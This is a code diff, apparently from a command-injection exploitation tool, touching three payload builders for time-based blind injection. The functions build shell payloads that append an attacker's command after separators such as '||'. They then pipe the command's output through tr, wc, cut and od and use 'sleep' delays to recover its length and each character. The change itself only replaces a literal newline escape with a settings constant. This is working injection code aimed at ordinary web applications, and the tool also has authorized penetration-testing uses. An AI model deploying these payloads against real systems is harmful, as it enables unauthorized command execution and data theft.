@@ -74,7 +74,7 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
       pipe = "|"
       payload = (pipe +
                  "[ " + str(output_length) + " -ne " + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.SINGLE_WHITESPACE +
-                 pipe + "tr -d '\\n' " + pipe + "wc -c" + settings.CMD_SUB_SUFFIX + " ]" + separator +
+                 pipe + "tr -d '" + settings.END_LINE.ESCAPED_LF + "'" + pipe + "wc -c" + settings.CMD_SUB_SUFFIX + " ]" + separator +
                  "sleep " + str(timesec)
                  )
     else:
@@ -210,7 +210,7 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
       pipe = "|"
       payload = (pipe +
                  "[ " +str(output_length)+ " -ne " + settings.CMD_SUB_PREFIX + "echo -n \"" + settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX + "\"" +
-                 pipe + "tr -d '\\n'  " + pipe + "wc -c" + settings.CMD_SUB_SUFFIX + " ]" + separator +
+                 pipe + "tr -d '" + settings.END_LINE.ESCAPED_LF + "'" + pipe + "wc -c" + settings.CMD_SUB_SUFFIX + " ]" + separator +
                  "sleep " + str(timesec)
                  )
     else:
@@ -347,7 +347,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                "[ " + str(ascii_char) + " -ne " + settings.CMD_SUB_PREFIX + cmd + pipe + "tr -d '\\n'" +
+                "[ " + str(ascii_char) + " -ne " + settings.CMD_SUB_PREFIX + cmd + pipe + "tr -d '" + settings.END_LINE.ESCAPED_LF + "'" +
                 pipe + "cut -c " + str(num_of_chars) + pipe + "od -N 1 -i" +
                 pipe + "head -1" + pipe + "awk '{print$2}'" + settings.CMD_SUB_SUFFIX + " ]" + separator +
                 "sleep " + str(timesec)
